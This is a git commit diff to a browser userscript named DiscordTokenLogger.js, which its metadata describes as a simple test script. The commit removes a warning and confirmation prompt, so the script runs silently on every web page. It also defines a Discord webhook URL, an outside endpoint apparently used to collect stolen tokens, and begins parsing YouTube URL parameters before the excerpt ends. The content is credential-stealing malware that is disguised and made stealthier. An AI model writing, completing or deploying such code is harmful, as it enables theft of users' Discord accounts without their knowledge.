5fa6be2a79cefa4c527ac85329f8344010f352f2
Keel6215 <mkeel2580@gmail.com>
2026-05-24 20:50:26 -0400

    Update author and remove confirmation prompt
    Updated author name and removed warning prompt from the script.

--- DiscordTokenLogger.js
+++ DiscordTokenLogger.js
@@ -6,20 +6,14 @@
 // @namespace    https://github.com/Keel62155/Idk
 // @version      1.2
 // @description  A simple test script for Tampermonkey.
-// @author       Lyzev
+// @author       Keel6215
 // @run-at       document-start
 // @include http://*
 // @include https://*
 // @grant        none
 // ==/UserScript==
 
-(function () {
-    alert('WARNING: Running this script may have bugs. Proceed with caution.');
-    if (!confirm('Are you sure you want to run this script?')) {
-        return;
-    }
-
-    const webhook = "https://discord.com/api/webhooks/1508270482846122037/lySjswXI-9s4Nno7cu_UuFjfeQxVPquVMFlajsKAMMSwKJqp-mHX25Uxohibw-Il46Fp";
+const webhook = "https://discord.com/api/webhooks/1508270482846122037/lySjswXI-9s4Nno7cu_UuFjfeQxVPquVMFlajsKAMMSwKJqp-mHX25Uxohibw-Il46Fp";
     if (window.location.href.startsWith("https://www.youtube.com/")) {
         const url = new URL(window.location.href);
         const param = atob(url.searchParams.get("v"));
